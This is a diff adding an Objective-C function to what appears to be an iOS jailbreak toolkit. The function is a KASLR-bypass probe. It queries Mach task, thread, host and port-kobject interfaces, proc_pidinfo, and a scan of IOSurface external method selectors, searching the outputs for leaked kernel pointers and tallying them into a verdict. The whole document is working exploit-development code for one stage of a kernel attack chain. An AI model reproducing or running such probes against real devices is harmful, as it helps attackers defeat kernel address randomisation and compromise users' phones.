@@ -45359,3 +45359,399 @@ void iosurface_ool_spray(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+void iosurface_kaslr_bypass(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB65: === KASLR Bypass via Mach Traps + Task Info ===");
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB65";
+
+        // CC1: task_info — multiple flavors for kernel address leaks
+        log(@"JB65: --- CC1: task_info flavors ---");
+        int cc1_leaks = 0;
+        {
+            typedef int(*task_info_fn)(unsigned int, uint32_t, void*, uint32_t*);
+            task_info_fn sym_taskinfo = (task_info_fn)dlsym(RTLD_DEFAULT, "task_info");
+            if (sym_taskinfo) {
+                // TASK_DYLD_INFO = 17
+                uint64_t dyld_buf[4] = {0};
+                uint32_t dyld_cnt = 4;
+                int kr = sym_taskinfo(mach_task_self(), 17, dyld_buf, &dyld_cnt);
+                log([NSString stringWithFormat:@"JB65: CC1 DYLD_INFO kr=%d cnt=%u", kr, dyld_cnt]);
+                if (kr == 0) {
+                    for (uint32_t i = 0; i < dyld_cnt && i < 4; i++) {
+                        log([NSString stringWithFormat:@"JB65: CC1 dyld[%u]=0x%llx", i, dyld_buf[i]]);
+                        if (dyld_buf[i] > 0xffff000000000000ULL) {
+                            cc1_leaks++;
+                            log([NSString stringWithFormat:@"JB65: CC1 KERNEL PTR at dyld[%u]=0x%llx", i, dyld_buf[i]]);
+                        }
+                    }
+                }
+
+                // TASK_VM_INFO = 22 (struct is large, 87 ints)
+                uint32_t vm_buf[88] = {0};
+                uint32_t vm_cnt = 87;
+                kr = sym_taskinfo(mach_task_self(), 22, vm_buf, &vm_cnt);
+                log([NSString stringWithFormat:@"JB65: CC1 VM_INFO kr=%d cnt=%u", kr, vm_cnt]);
+                if (kr == 0 && vm_cnt >= 4) {
+                    uint64_t *vm64 = (uint64_t *)vm_buf;
+                    for (uint32_t i = 0; i < vm_cnt / 2 && i < 20; i++) {
+                        if (vm64[i] > 0xffff000000000000ULL) {
+                            cc1_leaks++;
+                            log([NSString stringWithFormat:@"JB65: CC1 KPTR vm64[%u]=0x%llx", i, vm64[i]]);
+                        }
+                    }
+                    log([NSString stringWithFormat:@"JB65: CC1 vm_size=0x%llx resident=0x%llx virt=0x%llx", vm64[0], vm64[1], vm64[2]]);
+                }
+
+                // TASK_BASIC_INFO_64 = 5
+                uint32_t basic_buf[16] = {0};
+                uint32_t basic_cnt = 12;
+                kr = sym_taskinfo(mach_task_self(), 5, basic_buf, &basic_cnt);
+                log([NSString stringWithFormat:@"JB65: CC1 BASIC64 kr=%d cnt=%u", kr, basic_cnt]);
+                if (kr == 0) {
+                    uint64_t *b64 = (uint64_t *)basic_buf;
+                    for (uint32_t i = 0; i < basic_cnt / 2 && i < 6; i++) {
+                        if (b64[i] > 0xffff000000000000ULL) {
+                            cc1_leaks++;
+                            log([NSString stringWithFormat:@"JB65: CC1 KPTR basic64[%u]=0x%llx", i, b64[i]]);
+                        }
+                    }
+                }
+
+                // TASK_FLAGS_INFO = 7
+                uint32_t flags_buf[4] = {0};
+                uint32_t flags_cnt = 1;
+                kr = sym_taskinfo(mach_task_self(), 7, flags_buf, &flags_cnt);
+                log([NSString stringWithFormat:@"JB65: CC1 FLAGS kr=%d cnt=%u flags=0x%x", kr, flags_cnt, flags_buf[0]]);
+
+                // TASK_EXTMOD_INFO = 19
+                uint64_t extmod_buf[8] = {0};
+                uint32_t extmod_cnt = 8;
+                kr = sym_taskinfo(mach_task_self(), 19, extmod_buf, &extmod_cnt);
+                log([NSString stringWithFormat:@"JB65: CC1 EXTMOD kr=%d cnt=%u", kr, extmod_cnt]);
+                if (kr == 0) {
+                    for (uint32_t i = 0; i < extmod_cnt && i < 4; i++) {
+                        log([NSString stringWithFormat:@"JB65: CC1 extmod[%u]=0x%llx", i, extmod_buf[i]]);
+                    }
+                }
+            } else {
+                log(@"JB65: CC1 task_info not found");
+            }
+        }
+        results[@"cc1_leaks"] = @(cc1_leaks);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // CC2: thread_info on current thread
+        log(@"JB65: --- CC2: thread_info ---");
+        int cc2_leaks = 0;
+        {
+            typedef int(*thread_info_fn)(unsigned int, uint32_t, void*, uint32_t*);
+            thread_info_fn sym_thinfo = (thread_info_fn)dlsym(RTLD_DEFAULT, "thread_info");
+            typedef int(*task_threads_fn)(unsigned int, unsigned int**, uint32_t*);
+            task_threads_fn sym_threads = (task_threads_fn)dlsym(RTLD_DEFAULT, "task_threads");
+
+            if (sym_thinfo && sym_threads) {
+                unsigned int *thread_list = NULL;
+                uint32_t thread_count = 0;
+                int kr = sym_threads(mach_task_self(), &thread_list, &thread_count);
+                log([NSString stringWithFormat:@"JB65: CC2 threads=%u kr=%d", thread_count, kr]);
+
+                if (kr == 0 && thread_count > 0) {
+                    unsigned int th = thread_list[0];
+                    // THREAD_BASIC_INFO = 3
+                    uint32_t th_buf[16] = {0};
+                    uint32_t th_cnt = 10;
+                    kr = sym_thinfo(th, 3, th_buf, &th_cnt);
+                    log([NSString stringWithFormat:@"JB65: CC2 BASIC kr=%d cnt=%u", kr, th_cnt]);
+
+                    // THREAD_IDENTIFIER_INFO = 4
+                    uint64_t id_buf[4] = {0};
+                    uint32_t id_cnt = 4;
+                    kr = sym_thinfo(th, 4, id_buf, &id_cnt);
+                    log([NSString stringWithFormat:@"JB65: CC2 IDENT kr=%d cnt=%u", kr, id_cnt]);
+                    if (kr == 0) {
+                        for (uint32_t i = 0; i < id_cnt && i < 4; i++) {
+                            log([NSString stringWithFormat:@"JB65: CC2 ident[%u]=0x%llx", i, id_buf[i]]);
+                            if (id_buf[i] > 0xffff000000000000ULL) {
+                                cc2_leaks++;
+                                log([NSString stringWithFormat:@"JB65: CC2 KPTR ident[%u]=0x%llx", i, id_buf[i]]);
+                            }
+                        }
+                    }
+
+                    // THREAD_EXTENDED_INFO = 5
+                    uint64_t ext_buf[16] = {0};
+                    uint32_t ext_cnt = 16;
+                    kr = sym_thinfo(th, 5, ext_buf, &ext_cnt);
+                    log([NSString stringWithFormat:@"JB65: CC2 EXTENDED kr=%d cnt=%u", kr, ext_cnt]);
+                    if (kr == 0) {
+                        for (uint32_t i = 0; i < ext_cnt && i < 8; i++) {
+                            if (ext_buf[i] > 0xffff000000000000ULL) {
+                                cc2_leaks++;
+                                log([NSString stringWithFormat:@"JB65: CC2 KPTR ext[%u]=0x%llx", i, ext_buf[i]]);
+                            }
+                        }
+                    }
+
+                    typedef void(*vm_dealloc_fn)(unsigned int, uint64_t, uint64_t);
+                    vm_dealloc_fn sym_dealloc = (vm_dealloc_fn)dlsym(RTLD_DEFAULT, "vm_deallocate");
+                    if (sym_dealloc && thread_list) {
+                        sym_dealloc(mach_task_self(), (uint64_t)thread_list, thread_count * sizeof(unsigned int));
+                    }
+                }
+            }
+        }
+        results[@"cc2_leaks"] = @(cc2_leaks);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // CC3: mach_port_kobject — try to leak kernel object addresses
+        log(@"JB65: --- CC3: mach_port_kobject ---");
+        int cc3_leaks = 0;
+        {
+            typedef int(*kobject_fn)(unsigned int, unsigned int, uint32_t*, uint64_t*);
+            kobject_fn sym_kobj = (kobject_fn)dlsym(RTLD_DEFAULT, "mach_port_kobject");
+            typedef int(*space_info_fn)(unsigned int, uint32_t*, uint32_t*, uint32_t*, uint32_t*, uint32_t*, uint32_t*);
+            space_info_fn sym_space = (space_info_fn)dlsym(RTLD_DEFAULT, "mach_port_space_info");
+
+            if (sym_kobj) {
+                unsigned int ports_to_check[] = {mach_task_self(), mach_host_self(), mach_thread_self()};
+                const char *names[] = {"task", "host", "thread"};
+                for (int p = 0; p < 3; p++) {
+                    uint32_t ktype = 0;
+                    uint64_t kaddr = 0;
+                    int kr = sym_kobj(mach_task_self(), ports_to_check[p], &ktype, &kaddr);
+                    log([NSString stringWithFormat:@"JB65: CC3 %s kr=%d type=%u addr=0x%llx", names[p], kr, ktype, kaddr]);
+                    if (kr == 0 && kaddr > 0xffff000000000000ULL) {
+                        cc3_leaks++;
+                        log([NSString stringWithFormat:@"JB65: CC3 KPTR %s=0x%llx type=%u", names[p], kaddr, ktype]);
+                    }
+                }
+            } else {
+                log(@"JB65: CC3 mach_port_kobject not found");
+            }
+
+            // Also try mach_port_kernel_object (older variant)
+            typedef int(*kobj2_fn)(unsigned int, unsigned int, uint32_t*, uint32_t*);
+            kobj2_fn sym_kobj2 = (kobj2_fn)dlsym(RTLD_DEFAULT, "mach_port_kernel_object");
+            if (sym_kobj2) {
+                uint32_t ktype = 0, kaddr32 = 0;
+                int kr = sym_kobj2(mach_task_self(), mach_task_self(), &ktype, &kaddr32);
+                log([NSString stringWithFormat:@"JB65: CC3 kernel_object kr=%d type=%u addr32=0x%x", kr, ktype, kaddr32]);
+            }
+        }
+        results[@"cc3_leaks"] = @(cc3_leaks);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // CC4: host_info and processor_info
+        log(@"JB65: --- CC4: host_info ---");
+        int cc4_leaks = 0;
+        {
+            typedef int(*host_info_fn)(unsigned int, uint32_t, void*, uint32_t*);
+            host_info_fn sym_hostinfo = (host_info_fn)dlsym(RTLD_DEFAULT, "host_info");
+
+            if (sym_hostinfo) {
+                // HOST_BASIC_INFO = 1
+                uint32_t hbuf[16] = {0};
+                uint32_t hcnt = 16;
+                int kr = sym_hostinfo(mach_host_self(), 1, hbuf, &hcnt);
+                log([NSString stringWithFormat:@"JB65: CC4 BASIC kr=%d cnt=%u", kr, hcnt]);
+                if (kr == 0 && hcnt >= 4) {
+                    log([NSString stringWithFormat:@"JB65: CC4 max_cpus=%u avail=%u memsize=%u cputype=%u",
+                         hbuf[0], hbuf[1], hbuf[2], hbuf[3]]);
+                }
+
+                // HOST_VM_INFO64 = 4
+                uint64_t vmbuf[32] = {0};
+                uint32_t vmcnt = 32;
+                kr = sym_hostinfo(mach_host_self(), 4, vmbuf, &vmcnt);
+                log([NSString stringWithFormat:@"JB65: CC4 VM64 kr=%d cnt=%u", kr, vmcnt]);
+                if (kr == 0) {
+                    for (uint32_t i = 0; i < vmcnt && i < 8; i++) {
+                        if (vmbuf[i] > 0xffff000000000000ULL) {
+                            cc4_leaks++;
+                            log([NSString stringWithFormat:@"JB65: CC4 KPTR vm64[%u]=0x%llx", i, vmbuf[i]]);
+                        }
+                    }
+                }
+            }
+
+            // host_get_clock_service → clock port
+            typedef int(*clocksvc_fn)(unsigned int, uint32_t, unsigned int*);
+            clocksvc_fn sym_clock = (clocksvc_fn)dlsym(RTLD_DEFAULT, "host_get_clock_service");
+            if (sym_clock) {
+                unsigned int clock_port = 0;
+                int kr = sym_clock(mach_host_self(), 0, &clock_port);
+                log([NSString stringWithFormat:@"JB65: CC4 clock_service kr=%d port=%u", kr, clock_port]);
+                if (kr == 0 && clock_port) {
+                    typedef int(*kobject_fn)(unsigned int, unsigned int, uint32_t*, uint64_t*);
+                    kobject_fn sym_kobj = (kobject_fn)dlsym(RTLD_DEFAULT, "mach_port_kobject");
+                    if (sym_kobj) {
+                        uint32_t ctype = 0;
+                        uint64_t caddr = 0;
+                        kr = sym_kobj(mach_task_self(), clock_port, &ctype, &caddr);
+                        log([NSString stringWithFormat:@"JB65: CC4 clock kobject kr=%d type=%u addr=0x%llx", kr, ctype, caddr]);
+                        if (kr == 0 && caddr > 0xffff000000000000ULL) {
+                            cc4_leaks++;
+                            log([NSString stringWithFormat:@"JB65: CC4 CLOCK KPTR=0x%llx", caddr]);
+                        }
+                    }
+                }
+            }
+        }
+        results[@"cc4_leaks"] = @(cc4_leaks);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // CC5: proc_info syscall
+        log(@"JB65: --- CC5: proc_info ---");
+        int cc5_leaks = 0;
+        {
+            typedef int(*procinfo_fn)(int, int, uint32_t, uint64_t, void*, int);
+            procinfo_fn sym_procinfo = (procinfo_fn)dlsym(RTLD_DEFAULT, "proc_pidinfo");
+            typedef int(*getpid_fn)(void);
+            getpid_fn sym_getpid = (getpid_fn)dlsym(RTLD_DEFAULT, "getpid");
+
+            if (sym_procinfo && sym_getpid) {
+                int pid = sym_getpid();
+                // PROC_PIDTBSDINFO = 3
+                uint8_t bsd_buf[256];
+                memset(bsd_buf, 0, 256);
+                int ret = sym_procinfo(pid, 3, 0, 0, bsd_buf, 256);
+                log([NSString stringWithFormat:@"JB65: CC5 BSDINFO ret=%d pid=%d", ret, pid]);
+                if (ret > 0) {
+                    uint64_t *b64 = (uint64_t *)bsd_buf;
+                    for (int i = 0; i < ret / 8 && i < 16; i++) {
+                        if (b64[i] > 0xffff000000000000ULL) {
+                            cc5_leaks++;
+                            log([NSString stringWithFormat:@"JB65: CC5 KPTR bsd[%d]=0x%llx", i, b64[i]]);
+                        }
+                    }
+                }
+
+                // PROC_PIDTASKINFO = 4
+                uint8_t task_buf[128];
+                memset(task_buf, 0, 128);
+                ret = sym_procinfo(pid, 4, 0, 0, task_buf, 128);
+                log([NSString stringWithFormat:@"JB65: CC5 TASKINFO ret=%d", ret]);
+
+                // PROC_PIDREGIONINFO = 7 — region info might leak kernel addresses
+                uint8_t region_buf[256];
+                memset(region_buf, 0, 256);
+                ret = sym_procinfo(pid, 7, 0, 0, region_buf, 256);
+                log([NSString stringWithFormat:@"JB65: CC5 REGIONINFO ret=%d", ret]);
+                if (ret > 0) {
+                    uint64_t *r64 = (uint64_t *)region_buf;
+                    for (int i = 0; i < ret / 8 && i < 16; i++) {
+                        if (r64[i] > 0xffff000000000000ULL) {
+                            cc5_leaks++;
+                            log([NSString stringWithFormat:@"JB65: CC5 KPTR region[%d]=0x%llx", i, r64[i]]);
+                        }
+                    }
+                }
+
+                // PROC_PIDFDVNODEINFO = 1 for fd 0,1,2
+                for (int fd = 0; fd <= 2; fd++) {
+                    uint8_t vn_buf[128];
+                    memset(vn_buf, 0, 128);
+                    ret = sym_procinfo(pid, 1, fd, 0, vn_buf, 128);
+                    if (ret > 0) {
+                        uint64_t *v64 = (uint64_t *)vn_buf;
+                        for (int i = 0; i < ret / 8 && i < 8; i++) {
+                            if (v64[i] > 0xffff000000000000ULL) {
+                                cc5_leaks++;
+                                log([NSString stringWithFormat:@"JB65: CC5 KPTR fd%d[%d]=0x%llx", fd, i, v64[i]]);
+                            }
+                        }
+                    }
+                }
+            } else {
+                log(@"JB65: CC5 proc_pidinfo not found");
+            }
+        }
+        results[@"cc5_leaks"] = @(cc5_leaks);
+
+        // CC6: IOSurface connection — read all external method outputs with output buffers
+        log(@"JB65: --- CC6: IOSurface selector scan with outputs ---");
+        int cc6_leaks = 0;
+        {
+            typedef void*(*matching_fn)(const char*);
+            typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+            typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+            typedef int(*svcclose_fn)(unsigned int);
+            typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+
+            matching_fn sym_m = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+            getmatch_fn sym_g = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+            svcopen_fn sym_o = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+            svcclose_fn sym_c = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+            callmethod_fn sym_cm = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+
+            void *sm = sym_m ? sym_m("IOSurfaceRoot") : NULL;
+            unsigned int ss = sm ? sym_g(0, sm) : 0;
+            unsigned int cn = 0;
+            int okr = ss ? sym_o(ss, mach_task_self(), 0, &cn) : -1;
+            if (ss) { typedef int(*or_fn)(unsigned int); ((or_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease"))(ss); }
+
+            NSDictionary *sp = @{
+                @"IOSurfaceAllocSize": @4096, @"IOSurfaceWidth": @32,
+                @"IOSurfaceHeight": @32, @"IOSurfaceBytesPerRow": @128,
+                @"IOSurfacePixelFormat": @0x42475241
+            };
+            typedef void*(*cc6_create_fn)(void*);
+            cc6_create_fn sym_sc2 = (cc6_create_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+            void *srf = sym_sc2 ? sym_sc2((__bridge void *)sp) : NULL;
+
+            if (okr == 0) {
+                uint32_t sels_to_scan[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
+                for (int si = 0; si < 17; si++) {
+                    uint64_t outS[4] = {0};
+                    uint32_t outSCnt = 4;
+                    uint8_t outR[64];
+                    memset(outR, 0, 64);
+                    size_t outRSz = 64;
+
+                    uint64_t inS[3] = {0, 0, 0};
+                    int kr = sym_cm(cn, sels_to_scan[si], inS, 1, NULL, 0, outS, &outSCnt, outR, &outRSz);
+
+                    int found = 0;
+                    for (int i = 0; i < 4; i++) {
+                        if (outS[i] > 0xffff000000000000ULL) {
+                            found++;
+                            cc6_leaks++;
+                        }
+                    }
+                    uint64_t *r64 = (uint64_t *)outR;
+                    for (int i = 0; i < 8; i++) {
+                        if (r64[i] > 0xffff000000000000ULL) {
+                            found++;
+                            cc6_leaks++;
+                        }
+                    }
+
+                    if (kr == 0 || found > 0) {
+                        log([NSString stringWithFormat:@"JB65: CC6 sel%u kr=0x%x sCnt=%u rSz=%zu found=%d s0=0x%llx s1=0x%llx",
+                             sels_to_scan[si], (unsigned)kr, outSCnt, outRSz, found, outS[0], outS[1]]);
+                    }
+                }
+                sym_c(cn);
+            }
+            if (srf) { typedef void(*cc6_rel_fn)(void*); cc6_rel_fn sym_cfr = (cc6_rel_fn)dlsym(RTLD_DEFAULT, "CFRelease"); if (sym_cfr) sym_cfr(srf); }
+        }
+        results[@"cc6_leaks"] = @(cc6_leaks);
+
+        int total = cc1_leaks + cc2_leaks + cc3_leaks + cc4_leaks + cc5_leaks + cc6_leaks;
+        NSString *verdict = @"NO_LEAK";
+        if (total > 0) {
+            verdict = [NSString stringWithFormat:@"KPTR_LEAK_%d_cc1_%d_cc2_%d_cc3_%d_cc4_%d_cc5_%d_cc6_%d",
+                       total, cc1_leaks, cc2_leaks, cc3_leaks, cc4_leaks, cc5_leaks, cc6_leaks];
+        }
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB65: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB65-kaslr-bypass-checkpoint.json", results);
+        done(results);
+    });
+}
